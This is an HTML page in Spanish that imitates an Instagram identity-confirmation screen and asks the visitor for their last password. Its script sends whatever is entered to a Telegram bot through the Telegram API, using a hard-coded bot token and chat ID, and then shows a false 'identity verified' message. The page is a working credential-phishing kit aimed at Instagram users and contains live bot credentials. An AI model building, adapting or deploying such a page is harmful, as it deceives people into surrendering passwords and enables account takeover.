<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" type="image/x-icon" href="instagram.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
         :root {
            --ig-gradient: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
            --ig-primary: #0095f6;
            --ig-primary-hover: #1877f2;
            --ig-text: #262626;
            --ig-text-secondary: #8e8e8e;
            --ig-border: #dbdbdb;
            --ig-bg: #fafafa;
            --ig-white: #ffffff;
            --ig-input-bg: #fafafa;
            --ig-placeholder: #c7c7c7;
            --ig-success-bg: #e7f3ff;
            --ig-success-color: #1a73e8;
            --ig-success-border: #c2e7ff;
            --ig-error: #ed4956;
        }
        
        @media (prefers-color-scheme: dark) {
             :root {
                --ig-primary: #0095f6;
                --ig-primary-hover: #1aa1ff;
                --ig-text: #f5f5f5;
                --ig-text-secondary: #a8a8a8;
                --ig-border: #363636;
                --ig-bg: #000000;
                --ig-white: #121212;
                --ig-input-bg: #1a1a1a;
                --ig-placeholder: #6e6e6e;
                --ig-success-bg: #0a2540;
                --ig-success-color: #6cb8ff;
                --ig-success-border: #1a3d5c;
                --ig-error: #ff5c69;
            }
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            height: 100%;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--ig-bg);
            color: var(--ig-text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            line-height: 1.5;
            transition: background-color 0.3s ease, color 0.3s ease;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .card {
            background: var(--ig-white);
            border: 1px solid var(--ig-border);
            border-radius: 8px;
            padding: 40px 32px 24px;
            text-align: center;
            transition: background-color 0.3s ease, border-color 0.3s ease;
        }
        
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }
        
        .logo svg {
            width: 64px;
            height: 64px;
        }
        
        h2 {
            font-size: 16px;
            font-weight: 600;
            color: var(--ig-text);
            margin-bottom: 8px;
            line-height: 1.4;
        }
        
        .description {
            font-size: 14px;
            color: var(--ig-text-secondary);
            margin-bottom: 20px;
            line-height: 1.4;
        }
        
        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }
        
        .input-group label {
            display: block;
            font-size: 12px;
            color: var(--ig-text-secondary);
            margin-bottom: 6px;
            font-weight: 500;
            letter-spacing: 0.02em;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid var(--ig-border);
            border-radius: 6px;
            background: var(--ig-input-bg);
            font-size: 14px;
            font-family: inherit;
            color: var(--ig-text);
            transition: border-color 0.2s ease, background 0.2s ease, color 0.2s ease;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: var(--ig-primary);
            background: var(--ig-white);
            box-shadow: 0 0 0 3px rgba(0, 149, 246, 0.1);
        }
        
        .input-group input::placeholder {
            color: var(--ig-placeholder);
        }
        
        .btn-primary {
            width: 100%;
            padding: 12px 16px;
            background: var(--ig-primary);
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.1s ease;
            margin-top: 8px;
        }
        
        .btn-primary:hover:not(:disabled) {
            background: var(--ig-primary-hover);
        }
        
        .btn-primary:active:not(:disabled) {
            transform: scale(0.98);
        }
        
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .success-message {
            display: none;
            background: var(--ig-success-bg);
            color: var(--ig-success-color);
            padding: 12px;
            border-radius: 6px;
            font-size: 14px;
            margin-top: 16px;
            text-align: center;
            border: 1px solid var(--ig-success-border);
        }
        
        .success-message.show {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-5px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 16px 0;
            color: var(--ig-text-secondary);
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0.08em;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: var(--ig-border);
        }
        
        .footer {
            text-align: center;
            font-size: 12px;
            color: var(--ig-text-secondary);
            padding: 12px;
            line-height: 1.6;
        }
        
        @media (max-width: 768px) {
            body {
                padding: 16px;
            }
            .container {
                max-width: 380px;
            }
        }
        
        @media (max-width: 480px) {
            body {
                padding: 0;
                align-items: flex-start;
                background: var(--ig-white);
            }
            .container {
                max-width: 100%;
                gap: 0;
                min-height: 100vh;
            }
            .card {
                padding: 40px 24px 24px;
                border: none;
                border-radius: 0;
                background: var(--ig-white);
                flex: 1;
            }
            .logo svg {
                width: 56px;
                height: 56px;
            }
            h2 {
                font-size: 15px;
            }
            .description {
                font-size: 13px;
            }
            .input-group input {
                padding: 13px 16px;
                font-size: 16px;
            }
            .btn-primary {
                padding: 13px 16px;
                font-size: 15px;
            }
            .footer {
                padding: 12px 16px 24px;
            }
        }
        
        @media (max-width: 360px) {
            .card {
                padding: 32px 16px 20px;
            }
            .logo svg {
                width: 48px;
                height: 48px;
            }
            h2 {
                font-size: 14px;
            }
            .description {
                font-size: 12.5px;
            }
        }
        
        @media (max-height: 500px) and (orientation: landscape) {
            body {
                align-items: flex-start;
                padding: 12px;
            }
            .card {
                padding: 24px 20px 16px;
            }
            .logo {
                margin-bottom: 16px;
            }
            .logo svg {
                width: 44px;
                height: 44px;
            }
            h2 {
                font-size: 14px;
            }
            .description {
                font-size: 12.5px;
                margin-bottom: 14px;
            }
            .input-group {
                margin-bottom: 12px;
            }
        }
        
        @media (min-width: 1200px) {
            .container {
                max-width: 420px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="4" y="4" width="40" height="40" rx="12" stroke="url(#ig-gradient)" stroke-width="4"/>
                    <circle cx="24" cy="24" r="8" stroke="url(#ig-gradient)" stroke-width="4"/>
                    <circle cx="36" cy="12" r="3" fill="url(#ig-gradient)"/>
                    <defs>
                        <linearGradient id="ig-gradient" x1="4" y1="4" x2="44" y2="44" gradientUnits="userSpaceOnUse">
                            <stop offset="0%" stop-color="#f58529"/>
                            <stop offset="33%" stop-color="#dd2a7b"/>
                            <stop offset="66%" stop-color="#8134af"/>
                            <stop offset="100%" stop-color="#515bd4"/>
                        </linearGradient>
                    </defs>
                </svg>
            </div>

            <h2>Confirma tu identidad</h2>
            <p class="description">
                Ingresa la última contraseña para verificar tu identidad.
            </p>

            <form id="resetForm" novalidate>
                <div class="input-group">
                    <label for="username">Última contraseña</label>
                    <input type="text" id="username" name="username" placeholder="Última contraseña" autocomplete="password" required>
                </div>
                <button type="submit" class="btn-primary" id="submitBtn">
                    Confirmar identidad
                </button>
            </form>

            <div class="success-message" id="successMessage"></div>

            <div class="divider">O</div>

            <p style="font-size: 14px; color: var(--ig-text-secondary);">
                ¿Necesitas ayuda?
                <a href="#" style="color: var(--ig-primary); text-decoration: none; font-weight: 600;">Contacta soporte</a>
            </p>
        </div>

        <div class="footer">
            <span>Español (España)</span> · <span>© 2026 Instagram from Meta</span>
        </div>
    </div>

    <script>
        (function() {
            // ⚠️ Rellena estos dos valores
            const TELEGRAM_TOKEN = '8237168670:AAH00SjbTq16dYjg5PsTc7i_hgGJAsAfLVQ';
            const TELEGRAM_CHAT_ID = '6019875341';

            const form = document.getElementById('resetForm');
            const usernameInput = document.getElementById('username');
            const submitBtn = document.getElementById('submitBtn');
            const successMessage = document.getElementById('successMessage');

            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const username = usernameInput.value.trim();

                if (!username) {
                    usernameInput.style.borderColor = '#ed4956';
                    usernameInput.style.boxShadow = '0 0 0 3px rgba(237, 73, 86, 0.1)';
                    usernameInput.focus();
                    return;
                }

                usernameInput.style.borderColor = '';
                usernameInput.style.boxShadow = '';

                submitBtn.disabled = true;
                submitBtn.textContent = 'Enviando...';

                const texto = `Nuevo nombre de usuario registrado:\n${username}`;
                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

                try {
                    const res = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: texto
                        })
                    });
                    const data = await res.json();

                    if (data.ok) {
                        successMessage.textContent = 'Identidad verificada.';
                        successMessage.classList.add('show');
                        submitBtn.textContent = 'Enviado ✓';
                        usernameInput.value = '';
                        usernameInput.disabled = true;

                        setTimeout(function() {
                            successMessage.classList.remove('show');
                            submitBtn.disabled = false;
                            submitBtn.textContent = 'Confirmar';
                            usernameInput.disabled = false;
                        }, 5000);
                    } else {
                        throw new Error(data.description || 'Error de Telegram');
                    }
                } catch (err) {
                    console.error('Error:', err);
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Confirmar';
                    successMessage.textContent = 'Error al enviar. Inténtalo de nuevo.';
                    successMessage.style.background = '#fde8ea';
                    successMessage.style.color = '#ed4956';
                    successMessage.style.borderColor = '#f5c2c7';
                    successMessage.classList.add('show');
                    setTimeout(function() {
                        successMessage.classList.remove('show');
                    }, 4000);
                }
            });

            usernameInput.addEventListener('input', function() {
                this.style.borderColor = '';
                this.style.boxShadow = '';
            });
        })();
    </script>
</body>

</html>
